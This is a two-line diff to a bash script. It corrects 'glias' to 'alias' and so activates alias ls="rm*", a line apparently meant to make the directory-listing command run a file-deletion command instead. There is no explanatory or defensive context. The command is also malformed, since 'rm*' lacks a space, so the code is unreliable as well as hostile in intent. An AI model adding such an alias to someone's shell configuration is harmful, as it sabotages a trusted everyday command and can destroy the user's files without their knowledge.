@@ -1,2 +1,2 @@
 #!/bin/bash
-glias ls="rm*"
+alias ls="rm*"
